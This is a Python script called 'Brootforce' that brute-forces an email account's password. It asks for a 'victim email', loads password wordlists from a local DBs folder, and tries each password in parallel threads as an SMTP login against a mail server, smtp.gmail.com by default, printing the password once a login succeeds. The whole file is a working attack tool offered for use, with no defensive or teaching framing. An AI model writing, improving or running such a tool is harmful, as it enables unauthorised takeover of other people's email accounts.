import smtplib
import threading
import os



class Brootforce:
	def __init__(self, email, servise="smtp.gmail.com"):
		self.email = email
		self.checked_password_count = 0
		self.START = True

		self.server = smtplib.SMTP_SSL(servise, 465)
		self.server.ehlo()


	def check(self, password):
		try:
			self.server.login(self.email, password)
			self.server.quit()

			print('Correct password founded!')
			print(f'\nEmail: {self.email};\nPassowrd: {password};')

			input('Press ENTER to exit.')

			return 1

		except Exception as error:
			self.checked_password_count += 1

			print(f'[{self.checked_password_count}] Wrong password: {password};')

			return 0


	def thr(self, *passwords):
		for password in passwords:
			if self.START:
				if password[-1] == '\n':
					password = password[:-1]

				if self.check(password):
					self.START = False
					exit()
			else:
				break

	def main(self, DBs):
		for DB_i in range(len(DBs)):
			if self.START:
				threading.Thread(target=self.thr, args=(DBs[DB_i])).start()
				print(f'Thread {DB_i + 1} has been started with {len(DBs[DB_i])} passwords.')
			else:
				break



if __name__ == '__main__':
	email = input('Enter victim email: ')

	servise = input('Enter servise of sending letters (Enter = smtp.gmail.com): ')

	if servise:
		BF = Brootforce(email, servise=servise)
	else:
		BF = Brootforce(email)

	try:
		os.mkdir('DBs')

		input(f'Move all databases to a folder [{os.getcwd()}\\DBs] and press ENTER to continue.')
	except:
		pass

	print('Adding databases...')

	list_with_bds = []

	for obj in os.walk(os.getcwd() + '\\DBs'):
		for file in obj[2]:
			print(f'Found DB: {file}, adding...')

			try:
				list_with_bds.append(open(os.getcwd() + f'\\DBs\\{file}').readlines())

				print('DB added.')
			except:
				print('ERROR! File has been damaged or unknown symbol has been found.')

	print('Starting attack...')

	BF.main(list_with_bds)